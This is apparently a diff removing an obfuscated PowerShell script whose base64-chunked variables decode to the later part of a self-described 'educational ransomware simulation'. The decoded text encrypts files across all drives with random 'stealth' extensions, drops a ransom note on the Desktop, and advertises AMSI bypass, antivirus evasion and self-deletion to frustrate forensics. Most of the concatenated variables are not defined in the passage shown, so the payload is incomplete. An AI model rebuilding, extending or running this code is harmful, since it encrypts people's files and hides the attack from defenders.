-$YnVVdPZB = 'YXRlKSAtICRzdGFydFNj';
-$UflZThUe = 'YW4KCiAgICBXcml0ZS1I';
-$IcqyfxEE = 'b3N0ICIgIOKaoSBQcmlv';
-$SNirswWs = 'cml0eSBzY2FuIGNvbXBs';
-$HtBPgYle = 'ZXRlZCBpbiAkKFttYXRo';
-$UgJZGxgA = 'XTo6Um91bmQoJHNjYW5U';
-$VYBqcbBA = 'aW1lLlRvdGFsU2Vjb25k';
-$TPCayLmb = 'cywgMikpIHNlY29uZHMi';
-$ynenBBIN = 'IC1Gb3JlZ3JvdW5kQ29s';
-$ilHgceAB = 'b3IgR3JlZW4KCiAgICBX';
-$cHGMNJnV = 'cml0ZS1Ib3N0ICLwn5OK';
-$tFVXBZte = 'IEZvdW5kICQoJHRhcmdl';
-$tyazfQkg = 'dEZpbGVzLkNvdW50KSBm';
-$NiQwauFw = 'aWxlcyB0byBlbmNyeXB0';
-$HoxsElyM = 'IiAtRm9yZWdyb3VuZENv';
-$GZjpCIHV = 'bG9yIEdyZWVuCgogICAg';
-$zQRlCoXT = 'aWYgKCR0YXJnZXRGaWxl';
-$MoGpwEqQ = 'cy5Db3VudCAtZXEgMCkg';
-$WZYrabSB = 'ewogICAgICAgIFdyaXRl';
-$OeasVjPY = 'LUhvc3QgIuKdjCBObyBz';
-$eqbZgUIp = 'dWl0YWJsZSBmaWxlcyBm';
-$RiLmMRav = 'b3VuZC4gQ3JlYXRpbmcg';
-$jtkzDavF = 'dGVzdCBmaWxlcy4uLiIg';
-$KFXtYDlW = 'LUZvcmVncm91bmRDb2xv';
-$yDdvzaqb = 'ciBZZWxsb3cKICAgICAg';
-$nHPFhIDW = 'ICAkdGVzdERpciA9ICIk';
-$pUagykre = 'ZW52OlRFTVBcUmFuc29t';
-$bOBlgooH = 'd2FyZVRlc3QiCiAgICAg';
-$XHXdAxIr = 'ICAgTmV3LUl0ZW0gLUl0';
-$RoWRVBwN = 'ZW1UeXBlIERpcmVjdG9y';
-$tIvyKxUI = 'eSAtUGF0aCAkdGVzdERp';
-$BNLjiDDr = 'ciAtRm9yY2UgfCBPdXQt';
-$eRyeLwIv = 'TnVsbAogICAgICAgIDEu';
-$anlwwIBq = 'LjUgfCBGb3JFYWNoLU9i';
-$PgRuzhFU = 'amVjdCB7ICJUZXN0IGZp';
-$ItUdatZD = 'bGUgJF8gY29udGVudCIg';
-$EVJFbRDw = 'fCBPdXQtRmlsZSAiJHRl';
-$nelmDgYD = 'c3REaXJcdGVzdCRfLnR4';
-$umFPmadW = 'dCIgfQogICAgICAgICR0';
-$JfGntZli = 'YXJnZXRGaWxlcyA9IEdl';
-$fnDcKFAd = 'dC1DaGlsZEl0ZW0gJHRl';
-$idWFvYdJ = 'c3REaXIgLUZpbGUKICAg';
-$sfVAJddJ = 'ICAgICBXcml0ZS1Ib3N0';
-$HMblvKcY = 'ICLinIUgQ3JlYXRlZCB0';
-$bPtBeHKy = 'ZXN0IGZpbGVzIGluICR0';
-$VaFDXsTF = 'ZXN0RGlyIiAtRm9yZWdy';
-$GmYRTEQx = 'b3VuZENvbG9yIEdyZWVu';
-$uORGCoOw = 'CiAgICB9CgogICAgV3Jp';
-$TsbtOtiA = 'dGUtSG9zdCAiYG7wn5SQ';
-$dsbczUzD = 'IFN0YXJ0aW5nIGVuY3J5';
-$KhDrlGrv = 'cHRpb24gd2l0aCAkKCRD';
-$JoxsmpYc = 'b25maWcuTWF4VGhyZWFk';
-$gzWjuAFI = 'cykgdGhyZWFkcy4uLiIg';
-$rqPBwXMQ = 'LUZvcmVncm91bmRDb2xv';
-$IHjpCASK = 'ciBSZWQKCiAgICAjIFNo';
-$bTMIsBHZ = 'b3cgd2hpY2ggZmlsZXMg';
-$FPZxdkLH = 'd2lsbCBiZSBlbmNyeXB0';
-$kQDWhQdT = 'ZWQKICAgIFdyaXRlLUhv';
-$PKZjSwGc = 'c3QgIiAg8J+TiyBGaWxl';
-$gJvjwmcp = 'cyB0byBlbmNyeXB0OiIg';
-$LkxWhCCa = 'LUZvcmVncm91bmRDb2xv';
-$XnhMvxtj = 'ciBZZWxsb3cKICAgIGZv';
-$PJJExAKi = 'cmVhY2ggKCRmaWxlIGlu';
-$NXqNpLSv = 'ICR0YXJnZXRGaWxlcykg';
-$bIuGhLVJ = 'ewogICAgICAgICRzaXpl';
-$wGVRKFpA = 'ID0gaWYgKCRmaWxlLkxl';
-$xagPOTwV = 'bmd0aCAtZ3QgMU1CKSB7';
-$EjcnVzdq = 'CiAgICAgICAgICAgICIk';
-$tEKprmwW = 'KFttYXRoXTo6Um91bmQo';
-$ebBCPqfi = 'JGZpbGUuTGVuZ3RoLzFN';
-$qevSymeT = 'QiwgMikpIE1CIgogICAg';
-$jvyBjmqv = 'ICAgIH0gZWxzZWlmICgk';
-$oTelItZC = 'ZmlsZS5MZW5ndGggLWd0';
-$RnYCwkRJ = 'IDFLQikgewogICAgICAg';
-$gdvUFMkS = 'ICAgICAiJChbbWF0aF06';
-$XUVvnSUj = 'OlJvdW5kKCRmaWxlLkxl';
-$XPxWeHWL = 'bmd0aC8xS0IsIDIpKSBL';
-$yxPTVtLf = 'QiIKICAgICAgICB9IGVs';
-$KgvWGugd = 'c2UgewogICAgICAgICAg';
-$GXiQiSrb = 'ICAiJCgkZmlsZS5MZW5n';
-$JMppzarR = 'dGgpIGJ5dGVzIgogICAg';
-$LRGzYYcH = 'ICAgIH0KICAgICAgICBX';
-$SCRqMpbj = 'cml0ZS1Ib3N0ICIgICAg';
-$KvfqIBAq = '8J+ThCAkKFtTeXN0ZW0u';
-$RCATFUEk = 'SU8uUGF0aF06OkdldEZp';
-$WzBmaSJt = 'bGVOYW1lKCRmaWxlLkZ1';
-$nGuTzUrz = 'bGxOYW1lKSkgKCRzaXpl';
-$FZNCqVGu = 'KSIgLUZvcmVncm91bmRD';
-$emfCPmah = 'b2xvciBXaGl0ZQogICAg';
-$foyiDRVf = 'fQoKICAgICRzdGFydFRp';
-$ZQaBBNny = 'bWUgPSBHZXQtRGF0ZQog';
-$namepGtp = 'ICAgJGVuY3J5cHRpb25S';
-$dbQefhFW = 'ZXN1bHRzID0gU3RhcnQt';
-$hIdXpTnd = 'TXVsdGlUaHJlYWRlZEVu';
-$UPyspRFy = 'Y3J5cHRpb24gLUZpbGVz';
-$zrFVfWVX = 'ICR0YXJnZXRGaWxlcyAt';
-$UvmUslZW = 'S2V5ICRDb25maWcuRW5j';
-$LtHYnmKi = 'cnlwdGlvbktleSAtTWF4';
-$mbclHNLj = 'VGhyZWFkcyAkQ29uZmln';
-$ShtJmEfZ = 'Lk1heFRocmVhZHMgLVN0';
-$wtDCWECl = 'ZWFsdGhFeHRlbnNpb25z';
-$kGmkukOu = 'ICRDb25maWcuU3RlYWx0';
-$FNzKUUsw = 'aEV4dGVuc2lvbnMKCiAg';
-$EYdXnnbK = 'ICAkZHVyYXRpb24gPSAo';
-$SjQMXTUY = 'R2V0LURhdGUpIC0gJHN0';
-$JWAYETLv = 'YXJ0VGltZQogICAgJHN1';
-$gEUCKnby = 'Y2Nlc3NDb3VudCA9ICgk';
-$aVnNvEIQ = 'ZW5jcnlwdGlvblJlc3Vs';
-$WssaJROP = 'dHMgfCBXaGVyZS1PYmpl';
-$jeBoHYpm = 'Y3QgeyAkXy5TdWNjZXNz';
-$wKCPdOHN = 'IH0pLkNvdW50CiAgICBX';
-$hhElkOHQ = 'cml0ZS1Ib3N0ICLinIUg';
-$QptNhxyQ = 'U3VjY2Vzc2Z1bGx5IGVu';
-$sPGggVOD = 'Y3J5cHRlZCAkc3VjY2Vz';
-$qipsSNbh = 'c0NvdW50IGZpbGVzIGlu';
-$aaEUuMQt = 'ICQoW21hdGhdOjpSb3Vu';
-$iQlTUkAI = 'ZCgkZHVyYXRpb24uVG90';
-$ghexeSTi = 'YWxTZWNvbmRzLCAyKSkg';
-$AwOOFUgc = 'c2Vjb25kcyEiIC1Gb3Jl';
-$aNGXxjQV = 'Z3JvdW5kQ29sb3IgR3Jl';
-$SHRiQcKb = 'ZW4KCiAgICAjIFNob3cg';
-$dgJBFHCh = 'ZW5jcnlwdGVkIGZpbGVz';
-$bzFXtNEu = 'IHdpdGggc3RlYWx0aCBl';
-$lKejzqdP = 'eHRlbnNpb25zCiAgICBX';
-$nMtNVXcr = 'cml0ZS1Ib3N0ICJgbvCf';
-$QzuCWWOE = 'lJIgRW5jcnlwdGVkIEZp';
-$gaQOYCCI = 'bGVzIChTdGVhbHRoIE1v';
-$BTnsImUk = 'ZGUpOiIgLUZvcmVncm91';
-$IAjkiuEY = 'bmRDb2xvciBNYWdlbnRh';
-$qqoUtVwu = 'CiAgICBmb3JlYWNoICgk';
-$FyyGmCOy = 'cmVzdWx0IGluICRlbmNy';
-$dbWKhxuK = 'eXB0aW9uUmVzdWx0cykg';
-$XQrsaqMZ = 'ewogICAgICAgIGlmICgk';
-$HgquPUKL = 'cmVzdWx0LlN1Y2Nlc3Mp';
-$tkzrKqKR = 'IHsKICAgICAgICAgICAg';
-$kAFIxByP = 'JG9yaWdpbmFsTmFtZSA9';
-$XQcmxscn = 'IFtTeXN0ZW0uSU8uUGF0';
-$BTZbGNIH = 'aF06OkdldEZpbGVOYW1l';
-$uSrKhOPp = 'KCRyZXN1bHQuT3JpZ2lu';
-$UBZQsZlx = 'YWxQYXRoKQogICAgICAg';
-$yCOIesUh = 'ICAgICAkZW5jcnlwdGVk';
-$DpYoyXaO = 'TmFtZSA9IFtTeXN0ZW0u';
-$AVYITHPQ = 'SU8uUGF0aF06OkdldEZp';
-$nHzkAHMS = 'bGVOYW1lKCRyZXN1bHQu';
-$skIOOKEw = 'RW5jcnlwdGVkUGF0aCkK';
-$VaMkRCiA = 'ICAgICAgICAgICAgV3Jp';
-$zkXpYOVO = 'dGUtSG9zdCAiICDinIUg';
-$dKdmBxex = 'JG9yaWdpbmFsTmFtZSDi';
-$NFMtjDPH = 'hpIgJGVuY3J5cHRlZE5h';
-$MmzIQJCA = 'bWUgKHN0ZWFsdGgpIiAt';
-$GeEzMsKG = 'Rm9yZWdyb3VuZENvbG9y';
-$NpOVgsWO = 'IEdyZWVuCiAgICAgICAg';
-$YTpbmBem = 'fSBlbHNlIHsKICAgICAg';
-$jbvGMkHx = 'ICAgICAgJG9yaWdpbmFs';
-$nWlcXFSX = 'TmFtZSA9IFtTeXN0ZW0u';
-$DBLeRjOy = 'SU8uUGF0aF06OkdldEZp';
-$HSxwkfsd = 'bGVOYW1lKCRyZXN1bHQu';
-$NvTqjPlt = 'T3JpZ2luYWxQYXRoKQog';
-$apRSjghv = 'ICAgICAgICAgICBXcml0';
-$jfVlOJaS = 'ZS1Ib3N0ICIgIOKdjCAk';
-$ZsYrpAeZ = 'b3JpZ2luYWxOYW1lIC0g';
-$IfnkgGol = 'RmFpbGVkIHRvIGVuY3J5';
-$fooWkXWf = 'cHQiIC1Gb3JlZ3JvdW5k';
-$EJVgdevW = 'Q29sb3IgUmVkCiAgICAg';
-$xkQdWnsw = 'ICAgfQogICAgfQoKICAg';
-$yCVTodap = 'ICMgQ3JlYXRlIHJhbnNv';
-$nycUYiVQ = 'bSBub3RlIHdpdGggc3Rl';
-$BCpErUIM = 'YWx0aCBpbmZvcm1hdGlv';
-$qFbhHDoG = 'bgogICAgJHJhbnNvbU5v';
-$dGlBrCMr = 'dGUgPSBAIgrwn5qoIFlP';
-$gUjgvsCK = 'VVIgRklMRVMgSEFWRSBC';
-$WInwELjY = 'RUVOIEVOQ1JZUFRFRCEg';
-$DFXIMMbw = '8J+aqAoKVGhpcyBpcyBh';
-$RvIquASB = 'biBlZHVjYXRpb25hbCBy';
-$ZJeMYMHO = 'YW5zb213YXJlIHNpbXVs';
-$SggkWNbt = 'YXRpb24uCkFsbCB5b3Vy';
-$smkGDZOG = 'IGZpbGVzIGhhdmUgYmVl';
-$klRBIBjs = 'biBlbmNyeXB0ZWQgdXNp';
-$ygQrxkCe = 'bmcgQUVTLTI1NiB3aXRo';
-$SbodeKmB = 'IHN0ZWFsdGggZXh0ZW5z';
-$vQuWKgUg = 'aW9ucy4KCllvdXIgZmls';
-$UYIwSMkC = 'ZXMgbm93IGhhdmUgZXh0';
-$zXmdKYCZ = 'ZW5zaW9ucyBsaWtlOiAk';
-$dJyMwoGL = 'KCRDb25maWcuU3RlYWx0';
-$JYBauEeM = 'aEV4dGVuc2lvbnMgLWpv';
-$nAvyPfGR = 'aW4gJywgJykKClRvIGRl';
-$srbPOKqZ = 'Y3J5cHQgeW91ciBmaWxl';
-$nsUHwDhG = 'cywgcnVuIHRoZSBkZWNy';
-$IChrtlMP = 'eXB0b3Igc2NyaXB0IHdp';
-$mnBjVSPP = 'dGggdGhlIGtleToKJCgk';
-$gEaFjLaB = 'Q29uZmlnLkVuY3J5cHRp';
-$AhbCMZkM = 'b25LZXkpCgpFZHVjYXRp';
-$iIYIJqbM = 'b25hbCBQdXJwb3NlIE9u';
-$bkaQWUfO = 'bHkgLSBObyByZWFsIGRh';
-$XPBtwdvJ = 'bWFnZSBkb25lLgoiQAoK';
-$bPPztmWc = 'ICAgICRyYW5zb21Ob3Rl';
-$CjBXxNzx = 'IHwgT3V0LUZpbGUgIiRl';
-$KPRFShjE = 'bnY6VVNFUlBST0ZJTEVc';
-$mpQDuSIZ = 'RGVza3RvcFxSQU5TT01f';
-$eHozhshm = 'Tk9URS50eHQiIC1FbmNv';
-$UKrDEbQa = 'ZGluZyBVVEY4CiAgICBX';
-$fIPcZySA = 'cml0ZS1Ib3N0ICLwn5Od';
-$FgtwIUjC = 'IFJhbnNvbSBub3RlIGNy';
-$miraczpJ = 'ZWF0ZWQgb24gZGVza3Rv';
-$AhKBfzwc = 'cCAoaW5jbHVkZXMgc3Rl';
-$UFBtJzZP = 'YWx0aCBpbmZvKSIgLUZv';
-$scABuNKS = 'cmVncm91bmRDb2xvciBN';
-$AGsesuBe = 'YWdlbnRhCgogICAgIyBF';
-$sUbPFyuS = 'ZHVjYXRpb25hbCBzdW1t';
-$ttMsRhIO = 'YXJ5CiAgICBXcml0ZS1I';
-$JoGgoUCr = 'b3N0ICJgbvCfk5ogRWR1';
-$KdPDbvYt = 'Y2F0aW9uYWwgU3VtbWFy';
-$TCoGYnxM = 'eToiIC1Gb3JlZ3JvdW5k';
-$hnNoCqHI = 'Q29sb3IgQ3lhbgogICAg';
-$EkdvnpdL = 'V3JpdGUtSG9zdCAi4oCi';
-$hDbWDccS = 'IEFFUy0yNTYgZW5jcnlw';
-$RaisSFRJ = 'dGlvbiB3aXRoIHN0ZWFs';
-$MlxSuDJP = 'dGggZXh0ZW5zaW9ucyIg';
-$xLWkBkQO = 'LUZvcmVncm91bmRDb2xv';
-$QbwAyeee = 'ciBXaGl0ZQogICAgV3Jp';
-$bzIPZjWS = 'dGUtSG9zdCAi4oCiIFJl';
-$mPfhKCES = 'Y3Vyc2l2ZSBzY2Fubmlu';
-$SgaUcETz = 'ZzogQUxMIHN1YmZvbGRl';
-$hOjSoPQy = 'cnMgaW4gQUxMIGRpcmVj';
-$sjuYSAzu = 'dG9yaWVzIiAtRm9yZWdy';
-$tLeMiefd = 'b3VuZENvbG9yIFdoaXRl';
-$wGPbKxKA = 'CiAgICBXcml0ZS1Ib3N0';
-$afCHbQlw = 'ICLigKIgQ29tcHJlaGVu';
-$jOaIKWpR = 'c2l2ZSBjb3ZlcmFnZTog';
-$GnJpmpYT = 'QUxMIGRyaXZlcywgQUxM';
-$jGdFonGU = 'IGZvbGRlcnMsIEFMTCBm';
-$NdrsEpzp = 'aWxlcyIgLUZvcmVncm91';
-$nSOviBXs = 'bmRDb2xvciBXaGl0ZQog';
-$rUZYBBnG = 'ICAgV3JpdGUtSG9zdCAi';
-$kUXfVydj = '4oCiIFByaW9yaXR5IHRh';
-$fgOVdGIq = 'cmdldGluZzogRGVza3Rv';
-$ktvimPFE = 'cCwgRG9jdW1lbnRzLCBE';
-$kkKSreAc = 'b3dubG9hZHMgZmlyc3Qi';
-$ciTbxUFj = 'IC1Gb3JlZ3JvdW5kQ29s';
-$URMAbdwW = 'b3IgV2hpdGUKICAgIFdy';
-$TGbLAJFZ = 'aXRlLUhvc3QgIuKAoiBN';
-$ETcKxfdd = 'dWx0aS10aHJlYWRlZCBw';
-$PKFZwJRk = 'cm9jZXNzaW5nICh1cCB0';
-$qseWBGjk = 'byAkKCRDb25maWcuTWF4';
-$rwvijtnX = 'VGhyZWFkcykgdGhyZWFk';
-$lMwMRIsn = 'cykiIC1Gb3JlZ3JvdW5k';
-$UElsjAog = 'Q29sb3IgV2hpdGUKICAg';
-$UHEjTzts = 'IFdyaXRlLUhvc3QgIuKA';
-$uyGCOgoO = 'oiBFdmFzaW9uIHRlY2hu';
-$rLvkGgQE = 'aXF1ZXM6IEFNU0kgYnlw';
-$HraSBHnu = 'YXNzLCBBViBkZXRlY3Rp';
-$XNtiChJq = 'b24iIC1Gb3JlZ3JvdW5k';
-$gzulcsrU = 'Q29sb3IgV2hpdGUKICAg';
-$QuFSGaxK = 'IFdyaXRlLUhvc3QgIuKA';
-$VpbwgBQL = 'oiBObyBmaWxlIHNpemUg';
-$fotAvvFB = 'bGltaXRzOiBFbmNyeXB0';
-$HeWiDaTR = 'cyBBTEwgZmlsZXMgZm91';
-$rePrvOhJ = 'bmQiIC1Gb3JlZ3JvdW5k';
-$SPBcgFgM = 'Q29sb3IgV2hpdGUKICAg';
-$TERNkUhE = 'IFdyaXRlLUhvc3QgIuKA';
-$aoZUGTcz = 'oiBTeXN0ZW0gZGlyZWN0';
-$ZOOXUwVj = 'b3JpZXMgZXhjbHVkZWQg';
-$bpXeTmWe = 'Zm9yIHNhZmV0eSIgLUZv';
-$MUalmPBJ = 'cmVncm91bmRDb2xvciBX';
-$ainBspNI = 'aGl0ZQogICAgV3JpdGUt';
-$CdvQUQqD = 'SG9zdCAi4oCiIFRhcmdl';
-$DVJvbtKi = 'dHMgNDArIGZpbGUgdHlw';
-$smeEjewe = 'ZXM6IGRvY3MsIGltYWdl';
-$TKnSWfVd = 'cywgdmlkZW9zLCBjb2Rl';
-$vyBoiIdc = 'LCBkYXRhYmFzZXMiIC1G';
-$tYggiJkv = 'b3JlZ3JvdW5kQ29sb3Ig';
-$nEUQLzKV = 'V2hpdGUKICAgIFdyaXRl';
-$fpcNlnXN = 'LUhvc3QgIuKAoiBTdGVh';
-$eazfVjfD = 'bHRoIG1vZGU6IFJhbmRv';
-$lhSAnSdS = 'bSBleHRlbnNpb25zICgk';
-$RKjLmuVY = 'KCRDb25maWcuU3RlYWx0';
-$WGHJzUKD = 'aEV4dGVuc2lvbnMgLWpv';
-$VexaalbQ = 'aW4gJywgJykpIiAtRm9y';
-$YXuMHwcf = 'ZWdyb3VuZENvbG9yIFdo';
-$PqoFzPby = 'aXRlCiAgICBXcml0ZS1I';
-$GsDUfiQy = 'b3N0ICLigKIgU2VsZi1k';
-$JXsFyMnw = 'ZWxldGlvbiBmb3IgYW50';
-$lYsWikMv = 'aS1mb3JlbnNpYyBwdXJw';
-$xnWicPxq = 'b3NlcyIgLUZvcmVncm91';
-$UlLHbxiK = 'bmRDb2xvciBXaGl0ZQoK';
-$GHKttEmS = 'ICAgIFdyaXRlLUhvc3Qg';
-$ZgSueDhj = 'ImBu8J+nuSBDbGVhbmlu';
-$AsrsKOjw = 'ZyB1cC4uLiIgLUZvcmVn';
-$FzjtmjxA = 'cm91bmRDb2xvciBZZWxs';
-$lhYLKtdI = 'b3cKICAgIFN0YXJ0LVNs';
-$FGcDSbKo = 'ZWVwIC1TZWNvbmRzIDEK';
-$PydIVwxj = 'CiAgICAjIFNhZmUgc2Vs';
-$DWLktAKP = 'Zi1kZWxldGlvbiAoaGFu';
-$vcvsRgHx = 'ZGxlcyBib3RoIGZpbGUg';
-$gInlAhgD = 'YW5kIG1lbW9yeSBleGVj';
-$dXaUvHgw = 'dXRpb24pCiAgICB0cnkg';
-$TILeGMwf = 'ewogICAgICAgIGlmICgk';
-$CbgXHVrD = 'TXlJbnZvY2F0aW9uLk15';
-$KjfzvLxj = 'Q29tbWFuZC5QYXRoIC1h';
-$CJBlbPYC = 'bmQgKFRlc3QtUGF0aCAk';
-$XrSvYVSS = 'TXlJbnZvY2F0aW9uLk15';
-$pFkWoGQk = 'Q29tbWFuZC5QYXRoKSkg';
-$PtdQOVuL = 'ewogICAgICAgICAgICBS';
-$vfEIGkPJ = 'ZW1vdmUtSXRlbSAkTXlJ';
-$rZRJbmpv = 'bnZvY2F0aW9uLk15Q29t';
-$EQfOWoHq = 'bWFuZC5QYXRoIC1Gb3Jj';
-$gymVJzBj = 'ZSAtRXJyb3JBY3Rpb24g';
-$Ihlsozao = 'U3RvcAogICAgICAgICAg';
-$yxqsbvUn = 'ICBXcml0ZS1Ib3N0ICLw';
-$OYphqkGn = 'n5eR77iPICBTY3JpcHQg';
-$mpMvQAkj = 'ZmlsZSBkZWxldGVkIGZv';
-$svRUwuBO = 'ciBhbnRpLWZvcmVuc2lj';
-$EEyAcDNx = 'cyIgLUZvcmVncm91bmRD';
-$ZyKVvnQd = 'b2xvciBZZWxsb3cKICAg';
-$ZgHkFmhA = 'ICAgICB9IGVsc2Ugewog';
-$ZvfCslYD = 'ICAgICAgICAgICBXcml0';
-$GkNOdbBX = 'ZS1Ib3N0ICLwn5OdIFNj';
-$iGVABDgw = 'cmlwdCBydW5uaW5nIGZy';
-$xMCZptom = 'b20gbWVtb3J5IChubyBm';
-$FuDwLwMb = 'aWxlIHRvIGRlbGV0ZSki';
-$VHWcwJiP = 'IC1Gb3JlZ3JvdW5kQ29s';
-$yvzfVjiJ = 'b3IgWWVsbG93CiAgICAg';
-$BayvOIcn = 'ICAgfQogICAgfSBjYXRj';
-$flwEJGXE = 'aCB7CiAgICAgICAgV3Jp';
-$yuYfZRCL = 'dGUtSG9zdCAi4pqg77iP';
-$sFRfUYaU = 'ICBDb3VsZCBub3QgZGVs';
-$HVMVoMuv = 'ZXRlIHNjcmlwdCBmaWxl';
-$frqqCCfz = 'IiAtRm9yZWdyb3VuZENv';
-$NlCoRBIS = 'bG9yIFllbGxvdwogICAg';
-$VZLlntkG = 'fQoKICAgIFdyaXRlLUhv';
-$gGpYlIPd = 'c3QgIuKchSBTaW11bGF0';
-$gmVGIaIk = 'aW9uIGNvbXBsZXRlISBS';
-$yrNpaiSP = 'dW4gZGVjcnlwdG9yIHRv';
-$WcngvSQw = 'IHJlY292ZXIgZmlsZXMu';
-$zydYCsKP = 'IiAtRm9yZWdyb3VuZENv';
-$aCtgjVSD = 'bG9yIEdyZWVuCiAgICBX';
-$PsowcEZw = 'cml0ZS1Ib3N0ICLwn5SR';
-$GcWdNvMa = 'IERlY3J5cHRpb24gS2V5';
-$FYRlrsmn = 'OiAkKCRDb25maWcuRW5j';
-$potMrifr = 'cnlwdGlvbktleSkiIC1G';
-$drdapoUF = 'b3JlZ3JvdW5kQ29sb3Ig';
-$ALUsBGvI = 'Q3lhbgp9CgojIEV4ZWN1';
-$dafIfrdO = 'dGUgdGhlIHNpbXVsYXRp';
-$JhGsvUqt = 'b24KSW52b2tlLVJhbnNv';
-$jecNburJ = 'bXdhcmVTaW11bGF0aW9u';
-$iIreadrn = $null;
-$iIreadrn += $lGEuEWpb;
-$iIreadrn += $fZZIMTVb;
-$iIreadrn += $YBRETsXS;
-$iIreadrn += $szVXeRZb;
-$iIreadrn += $fKGZlfvX;
-$iIreadrn += $uFTDszcF;
-$iIreadrn += $AuzlFMcd;
-$iIreadrn += $VhXJLDeo;
-$iIreadrn += $mjpVtxBu;
-$iIreadrn += $xJjuuRkS;
-$iIreadrn += $KcPRBdyg;
-$iIreadrn += $uxuNLkyG;
-$iIreadrn += $yYBQIHDx;
-$iIreadrn += $cVqFZHkt;
-$iIreadrn += $gzxXLlYF;
-$iIreadrn += $sdBppOiX;
-$iIreadrn += $ubcJJDxJ;
-$iIreadrn += $jDxYRbKl;
-$iIreadrn += $hxSUsgNO;
-$iIreadrn += $nQHoAKyn;
-$iIreadrn += $ZlBhROLT;
-$iIreadrn += $oqqZlBGp;
-$iIreadrn += $MEaIRfhk;
-$iIreadrn += $JAZKgluu;
-$iIreadrn += $qiWjUbMQ;
-$iIreadrn += $JYvCdGQk;
-$iIreadrn += $whzQSUCy;
-$iIreadrn += $fcuMnvLX;
-$iIreadrn += $mnjuiXRE;
-$iIreadrn += $hbyxVInZ;
-$iIreadrn += $koPjYhsZ;
-$iIreadrn += $QXgmuLCH;
-$iIreadrn += $JwPhmBUu;
-$iIreadrn += $nIlitjTD;
-$iIreadrn += $KkioyYUc;
-$iIreadrn += $eeutDcmU;
-$iIreadrn += $EjopCufz;
-$iIreadrn += $NJvwsGaD;
-$iIreadrn += $xVttyyID;
-$iIreadrn += $JgKGWSRH;
-$iIreadrn += $tvVJXTeN;
-$iIreadrn += $ryJfjUpD;
-$iIreadrn += $UUttryzB;
-$iIreadrn += $whodSlln;
-$iIreadrn += $sXvFqGHP;
-$iIreadrn += $OWbCZFtx;
-$iIreadrn += $jmDWfIyy;
-$iIreadrn += $CEkpBAjt;
-$iIreadrn += $PtedVgzr;
-$iIreadrn += $rYnGLIJb;
-$iIreadrn += $kaNjxCdL;
-$iIreadrn += $iTdIBhXT;
-$iIreadrn += $DVkjdlwK;
-$iIreadrn += $QTGmoUab;
-$iIreadrn += $flJjJVTa;
-$iIreadrn += $FkXhcjFK;
-$iIreadrn += $Brimerng;
-$iIreadrn += $PJstSMHj;
-$iIreadrn += $RMpiovNG;
-$iIreadrn += $iFjvqypZ;
-$iIreadrn += $VzwapPKE;
-$iIreadrn += $ueGmEJix;
-$iIreadrn += $qwhPtGGa;
-$iIreadrn += $kmofZxcr;
-$iIreadrn += $mKItytJh;
-$iIreadrn += $WPornOAy;
-$iIreadrn += $qidtkRnO;
-$iIreadrn += $NHOYlMAj;
-$iIreadrn += $AdlHZrAJ;
-$iIreadrn += $mKrImbRR;
-$iIreadrn += $RfKPzuxW;
-$iIreadrn += $AiAsWOKb;
-$iIreadrn += $XreGXQHL;
-$iIreadrn += $gXNBFcnq;
-$iIreadrn += $yxkrmJyn;
-$iIreadrn += $NWVgnGpR;
-$iIreadrn += $NVWIMrWj;
-$iIreadrn += $BaKgtuVB;
-$iIreadrn += $koIBYFrO;
-$iIreadrn += $zIoWFaTt;
-$iIreadrn += $JKjsHRYb;
-$iIreadrn += $NujSMCMQ;
-$iIreadrn += $ghuSaBWI;
-$iIreadrn += $bKRJmKqz;
-$iIreadrn += $uzcXDvUM;
-$iIreadrn += $wYzmgyvV;
-$iIreadrn += $ahTFLvud;
-$iIreadrn += $wDmMaRGz;
-$iIreadrn += $uClbhhOP;
-$iIreadrn += $MGahakdp;
-$iIreadrn += $sMmAWCpJ;
-$iIreadrn += $jjqHEqSH;
-$iIreadrn += $XkWAXTuc;
-$iIreadrn += $nzvTrCVF;
-$iIreadrn += $AfnSQTFw;
-$iIreadrn += $izdEgKPv;
-$iIreadrn += $mQyKAlcC;
-$iIreadrn += $ivPnukMM;
-$iIreadrn += $vkRJUpzQ;
-$iIreadrn += $ILLftMgH;
-$iIreadrn += $blGTQcnS;
-$iIreadrn += $gXihHSQR;
-$iIreadrn += $SJpsrjFO;
-$iIreadrn += $jgmRvLms;
-$iIreadrn += $nQbSMnpj;
-$iIreadrn += $WSWCDNJB;
-$iIreadrn += $KxDKXyVF;
-$iIreadrn += $pdzfHldu;
-$iIreadrn += $AnwjHmoD;
-$iIreadrn += $DdBMfCDu;
-$iIreadrn += $OkyKFaOo;
-$iIreadrn += $wyYuLOAj;
-$iIreadrn += $vBYWEfhj;
-$iIreadrn += $KryxsghM;
-$iIreadrn += $oncdImAu;
-$iIreadrn += $YDCJUoFd;
-$iIreadrn += $CkNTYafM;
-$iIreadrn += $JGOWJJRS;
-$iIreadrn += $EYPyfJxF;
-$iIreadrn += $pqiSjFOB;
-$iIreadrn += $MnpPdgKL;
-$iIreadrn += $TdjKtAYf;
-$iIreadrn += $ruQaBTzx;
-$iIreadrn += $nCqERsIs;
-$iIreadrn += $wSgwGpjI;
-$iIreadrn += $BhIfQyfT;
-$iIreadrn += $takYvdof;
-$iIreadrn += $qIbDJRXs;
-$iIreadrn += $qbPVpLiO;
-$iIreadrn += $ZYKfJuWj;
-$iIreadrn += $poyKcKDH;
-$iIreadrn += $RqtLuUiE;
-$iIreadrn += $bwTakFCs;
-$iIreadrn += $xkSWMoVz;
-$iIreadrn += $LTXjfzKZ;
-$iIreadrn += $LUtZMSTx;
-$iIreadrn += $LpRKysCF;
-$iIreadrn += $hqMPFHEz;
-$iIreadrn += $ZWHTXAGV;
-$iIreadrn += $uXBfyaUx;
-$iIreadrn += $KgZpDzwA;
-$iIreadrn += $VbyfxpuI;
-$iIreadrn += $MLfnKvfV;
-$iIreadrn += $ZuDtfEre;
-$iIreadrn += $SYkeQbVe;
-$iIreadrn += $GniYGMkz;
-$iIreadrn += $cywMtXuz;
-$iIreadrn += $EfbMNzmm;
-$iIreadrn += $clOdMvws;
-$iIreadrn += $uIYLnDbA;
-$iIreadrn += $vgWrRLJg;
-$iIreadrn += $gdgrAWFo;
-$iIreadrn += $HpNQwySn;
-$iIreadrn += $BNVReiMp;
-$iIreadrn += $NDuOXQeE;
-$iIreadrn += $hiOevvvy;
-$iIreadrn += $jfuWMtKd;
-$iIreadrn += $WIDbEzOA;
-$iIreadrn += $ZRnpKwvX;
-$iIreadrn += $gpRbMeCP;
-$iIreadrn += $vBfjTpKn;
-$iIreadrn += $ZtouKEmQ;
-$iIreadrn += $CVauICrY;
-$iIreadrn += $lRPGBnIs;
-$iIreadrn += $oqdTXABz;
-$iIreadrn += $qoViinan;
-$iIreadrn += $XnHKpmuo;
